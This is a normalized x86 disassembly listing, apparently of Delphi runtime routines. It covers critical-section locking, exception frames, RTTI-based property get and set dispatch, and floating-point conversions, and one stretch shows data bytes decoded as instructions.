call sub_404ee4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413fac
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403174
sub_413ff4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_414168
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_4141e8
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_414048
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414080
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_414168
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4140bc
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403528
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_41411f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414126
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4141c0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403228
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4141e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_414290
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404ee4
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4142a0
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414376
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_414359
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404eec
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414360
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4030c4
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_404150
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407db4
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4143a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41440f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414416
retn
call sub_413f44
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_4050ac
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404968
mov eax rw-data
call sub_403eec
mov eax rw-data
call sub_40ece8
sub_414418
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4144b9
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4144c0
retn
mov eax rw-data
call sub_413ea0
mov eax sub_40e9e8
mov [ rw-data ] eax
mov eax sub_40e538
mov [ rw-data ] eax
mov edx sub_40e448
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40ece8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413a94
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40effc
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_411fec
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412714
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4144c4
xchg [ fs : edi ] al
scasb [ edi ]
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ edi + 0x640000ff ] ch
xchg [ edi ] al
nop
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ecx + 0x640000ff ] dl
xchg [ edi ] al
xchg edx eax
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebx + 0x640000ff ] dl
xchg [ edi ] al
xchg esp eax
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebp + 0x640000ff ] dl
xchg [ edi ] al
xchg esi eax
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ edi + 0x640000ff ] dl
xchg [ edi ] al
cwde
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ecx + 0x640000ff ] bl
xchg [ edi ] al
0x640000ff 0x4786
add [ ebx + 0x640000ff ] bl
xchg [ edi ] al
pushfd
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ ebp + 0x640000ff ] bl
xchg [ edi ] al
sahf
inc [ eax ]
add [ esi + eax * 4 + 0x47 ] ah
add [ edi + 0x640000ff ] bl
xchg [ edi ] al
cmp bh 0x0
add [ esi + eax * 4 + 0x47 ] ah
add [ ecx + 0x640000ff ] al
xchg [ edi ] al
cmp bh 0x0
add [ esi + eax * 4 + 0x47 ] ah
add [ ebx + 0x640000ff ] al
xchg [ edi ] al
test bh bh
add [ eax ] al
xchg [ fs : edi ] al
test edi edi
add [ eax ] al
xchg [ fs : edi ] al
xchg bh bh
add [ eax ] al
xchg [ fs : edi ] al
xchg edi edi
add [ eax ] al
xchg [ fs : edi ] al
mov bh bh
add [ eax ] al
xchg [ fs : edi ] al
mov edi edi
add [ eax ] al
xchg [ fs : edi ] al
mov bh bh
add [ eax ] al
xchg [ fs : edi ] al
mov edi edi
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4145d9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4145e0
retn
sub_414624
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4146e2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_414618
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_414618
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_407f80
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_403f40
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_407db4
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4146e9
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_407cd4
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_403f40
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_404150
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_4146fc
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_414748
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_414618
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_4080bc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4146fc
mov edx [ rw-data ]
mov eax esi
call sub_407db4
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407db4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_4080bc
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_4147ac
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_41481c
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_414870
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_4148a0
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_414914
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_414970
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_4149b4
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414a30
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404188
mov ecx esp
mov edx esi
mov eax ebx
call sub_4149b4
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_414a78
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_414a64
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_414ab8
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_414a64
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414af8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414b40
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_414c14
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_404174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b47
lea eax [ ebp - 0x4 ]
call sub_4045cc
retn
sub_414b50
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414b98
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404718
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_414cfc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b9f
lea eax [ ebp - 0x4 ]
call sub_4045cc
retn
sub_414ba8
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414a08
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414a78
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_414af8
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_403eec
pop ebx
retn
sub_414be8
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_414a30
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_414ab8
pop ebx
retn
dec bl
je r-xdata
call sub_414b50
jmp r-xdata
pop ebx
retn
sub_414c14
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414cec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_414ba8
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404718
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414cf3
lea eax [ ebp - 0x10 ]
call sub_403eec
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_404608
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4045cc
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_414cfc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414dc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404174
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_414be8
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414dc9
lea eax [ ebp - 0xc ]
call sub_403eec
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404608
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_414dd0
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_414618
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_414e10 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_414618
cmp [ eax ] 0x4
jne r-xdata
sub_414ee8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_414618
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_414f30 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41505f ]
jmp [ eax * 4 + jump_table_414fcc ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_4150f4
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_4150e0
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_415134
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4150e0
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_415174
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_4151b4
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_4151ec
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
